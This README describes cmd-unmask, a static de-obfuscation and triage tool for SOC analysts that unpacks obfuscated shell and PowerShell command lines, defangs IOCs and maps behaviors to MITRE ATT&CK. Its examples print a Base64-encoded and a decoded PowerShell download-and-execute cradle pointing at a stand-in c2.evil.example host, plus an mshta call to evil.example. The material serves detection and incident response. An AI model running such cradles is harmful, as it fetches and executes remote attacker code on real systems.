# cmd-unmask

**Static Command-Line De-Obfuscation & Behavioral Triage Tracer Script for SOC Alert Analysis**

`cmd-unmask` is a lightweight, 100% static command-line de-obfuscation and behavioral triage utility engineered for Security Operations Center (SOC) analysts and Incident Responders. Built exclusively on the Python 3 standard library (`>= 3.11`) with zero external runtime dependencies, `cmd-unmask` unmasks multi-layered Windows (`cmd.exe`, PowerShell) and Linux (`bash`/`sh`) command lines, extracts and defangs Indicators of Compromise (IOCs) across every intermediate layer, maps adversary behaviors and LOLBins to MITRE ATT&CK, and generates ready-to-paste SOC offense notes.

---

## The SOC Triage Problem

Tier-1 and Tier-2 SOC analysts triaging process-creation alerts across SIEM and EDR platforms (QRadar, Wazuh, SentinelOne, FortiGate, ArcSight) routinely face heavily obfuscated command lines designed to evade static signatures and delay human analysis:

- **Shell-Level DOSfuscation**: Caret (`^`) insertion, empty quote pairs (`""`), `%ComSpec%` / environment variable substring slicing (`%var:~offset,len%`), and PowerShell backtick (`` ` ``) obfuscation.
- **Static Expression Obfuscation**: PowerShell format operators (`"{1}{0}" -f`), `[char]` / `[char[]]` casting, `-join` / `[string]::Join`, case-sensitive `.Replace()` vs. case-insensitive `-replace`, string reversal, and Bash ANSI-C quoting (`$'\x63\x75\x72\x6c'`) or `${var//a/b}` parameter expansion.
- **Multi-Layer Payload Encoding & Compression**: Unpadded or URL-safe Base64 (`-enc`), UTF-16LE vs. UTF-8 byte streams, `IO.Compression.GzipStream` / `DeflateStream` payloads, hex blobs, URL percent-encoding, `fromCharCode` arrays, and single-byte XOR loops.
- **Workstation EDR Friction**: Passing raw obfuscated stagers directly on an analyst workstation CLI (`-c "powershell -enc ..."`) frequently triggers local EDR/AMSI command-line blocks (`Access is denied`) or risks accidental execution if pasted into a live shell.

`cmd-unmask` solves these challenges with **strictly zero dynamic execution** (`eval`, `exec`, or child shell spawning are never used) and **high Detection Rigidity** (suppressing `.NET` namespace False Positives and enforcing strict resource ceilings against zip-bombs).

---

## Four-Pillar Architecture

```text
  [ Raw CLI / OS Clipboard (-p) / SIEM Batch File (JSON, JSONL, Text) ]
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 1: Ingestion Pipeline & Quote-Aware Two-Pass Shell Normalizer  │
│  • Auto-detects SIEM keys (CommandLine, process.command_line, etc.)   │
│  • Unescapes outer JSON/SIEM quotes (\" -> ")                       │
│  • Pass 1 (cmd.exe): Strips ^ & "", resolves %ComSpec% & %var:~x,y%  │
│  • Pass 2 (PowerShell): Strips noise backticks while preserving `n/`t │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 2: Interleaved Unpacking DAG & Case-Aware Expression Resolver  │
│  • Bounded BFS DAG (max_depth=10, max_nodes=32, SHA-256 deduplicated) │
│  • Interleaves per-node: Normalizer -> Expression Resolver -> Carvers │
│  • Decoders: Base64 (UTF-16LE/UTF-8, URL-safe, unpadded), Gzip,       │
│    Deflate (32MB chunked ceiling), Hex, URL, CharCode, & Gated XOR    │
│  • Splices decoded spans into Reconstructed Commands & ranks leaves   │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 3: Full-DAG Contextual IOC Extractor & Automatic Defanging     │
│  • Harvests IOCs across EVERY Payload Node (preserving intermediate   │
│    stager domains/IPs that disappear in final in-memory cradles)      │
│  • Extracts URLs, Domains (including URL hostnames), IPv4/IPv6,       │
│    Windows/POSIX file paths, Registry keys, Named Pipes, MD5/SHA      │
│  • Suppresses .NET classes ([Net.WebClient]) & script filenames       │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 4: MITRE ATT&CK Behavioral Classifier & Operator Renderer      │
│  • Dual-stage scoring: Base Behavioral Intent + Obfuscation Bonus     │
│  • Detects LOLBins (certutil, mshta, rundll32, regsvr32, wmic, bits), │
│    AMSI/ETW tampering, credential dumping (lsass/ntds/sam), cradles   │
│  • Renders ANSI Pretty UI, Ready-to-Paste SOC Ticket Note, MD, JSONL  │
└───────────────────────────────────────────────────────────────────────┘
```

---

## Domain Documentation & Architecture Decision Records

- **Domain Glossary**: [`GLOSSARY.md`](GLOSSARY.md) defines canonical ubiquitous language (`Tracer Script`, `Ingestion Pipeline`, `Unpacking DAG`, `Payload Node`, `Detection Rigidity`, `Primary Unmasked Payload`, `Defanged IOC`, `Triage Verdict`).
- **Architecture Decision Records (`docs/adr/`)**:
  - [ADR-0001: Static Standard-Library-Only Analysis with Zero Dynamic Execution](docs/adr/0001-static-stdlib-only-analysis.md)
  - [ADR-0002: Quote-Aware Two-Pass Shell Normalizer](docs/adr/0002-quote-aware-two-pass-shell-normalizer.md)
  - [ADR-0003: Bounded Unpacking DAG with Pruning Gates and Padding-Tolerant Base64](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)
  - [ADR-0004: Case-Aware Bottom-Up Static Expression Resolver](docs/adr/0004-case-aware-static-expression-resolver.md)
  - [ADR-0005: Full-DAG IOC Harvesting and Dual-Stage Behavioral Intent Scoring](docs/adr/0005-full-dag-ioc-harvesting-and-intent-scoring.md)
  - [ADR-0006: Interleaved Node Processing Cycle and Deterministic Primary Leaf Ranking](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)
  - [ADR-0007: Contextual IOC Validation to Suppress Namespace and Hex-Blob False Positives](docs/adr/0007-contextual-ioc-false-positive-suppression.md)
  - [ADR-0008: Operator UX, Win32 Clipboard Ingestion, and Layer-by-Layer Timeline Rendering](docs/adr/0008-operator-ux-clipboard-ingestion-and-timeline-rendering.md)

---

## Installation

`cmd-unmask` requires Python `>= 3.11` and installs with zero third-party packages:

```bash
git clone <repository-url>
cd cmd-unmask
pip install -e .
```

Run the verification suite using Python's built-in `unittest` runner:

```bash
python -m unittest discover -s tests -v
```

---

## CLI Usage

### 1. Clipboard & Interactive Mode (Recommended on EDR-Protected Workstations)

Passing raw obfuscated PowerShell or `cmd.exe` strings directly as CLI arguments can trigger local endpoint protection (Windows Defender / SentinelOne blocking process creation). Use clipboard or interactive mode to bypass CLI argument inspection safely:

```bash
# Read obfuscated command directly from OS clipboard and copy the SOC Ticket Note back to clipboard
cmd-unmask -p --copy-note

# Launch interactive prompt (paste command or press Enter to read from clipboard)
cmd-unmask
```

### 2. Single Command & Standard Input

```bash
# Analyze a single command string (defaults to --format pretty)
cmd-unmask -c "p^o^w^e^r^s^h^e^l^l -NoP -W Hidden -enc SQBFAFgA..."

# Disable ANSI color codes or emit raw (undefanged) IOCs
cmd-unmask -c "powershell -c ('{1}{0}' -f 'Client','Net.Web')" --no-color --no-defang

# Pipe from stdin and emit structured JSON
echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format json
```

### 3. Batch SIEM / EDR Alert Triage (QRadar, Wazuh, SentinelOne)

`cmd-unmask` ingests raw line-delimited text files, JSON arrays, and JSONL logs. It automatically inspects standard SIEM fields (`CommandLine`, `command_line`, `cmd`, `process.command_line`, `data.win.eventdata.commandLine`, `payload`) and isolates malformed records without crashing:

```bash
# Triage a JSONL export from Wazuh/SentinelOne/QRadar
cmd-unmask -f alerts.jsonl --format jsonl

# Specify a custom JSON field and enforce a CI/SOAR severity exit gate (exit code 2 on HIGH+)
cmd-unmask -f offense_export.json --field custom_process_cmd --fail-on HIGH
```

---

## Sample Output (`--format pretty`)

```text
╔════════════════════════════════════════════════════════════════════╗
║ Triage Verdict [cli] | Severity: CRITICAL (100/100)                ║
╚════════════════════════════════════════════════════════════════════╝

[1] UNMASKING TIMELINE (LAYER-BY-LAYER)
  ├─► Step 0 [Raw Input]
  │   p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  ├─► Step 1 [Shell Normalizer]
  │   powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  └─► Step 2 [Base64 UTF-16LE Decoded] [FINAL UNMASKED PAYLOAD]
      powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')

[2] EXTRACTED IOCs (DEFANGED)
  ├─► [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 2 [Base64 UTF-16LE Decoded])
  └─► [domain] c2[.]evil[.]example (from Step 2 [Base64 UTF-16LE Decoded])

[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)
  ├─► T1027.010 (Defense Evasion) - Command Obfuscation (Shell/Expression Layer): Applied Shell Normalizer (Step 1 [Shell Normalizer])
  ├─► T1140 (Defense Evasion) - Deobfuscate/Decode Payload Layer: Applied Base64 UTF-16LE Decoded (Step 2 [Base64 UTF-16LE Decoded])
  ├─► T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
  └─► T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 2 [Base64 UTF-16LE Decoded])

[4] READY-TO-PASTE SOC TICKET NOTE
────────────────────────────────────────────────────────────────────
[SOC TRIAGE NOTE - cli]
Verdict       : CRITICAL (Risk Score: 100/100)
Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
Unmasked Cmd  :
  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
Extracted IOCs:
  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - [DOMAIN] c2[.]evil[.]example
MITRE ATT&CK  :
  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
────────────────────────────────────────────────────────────────────
```
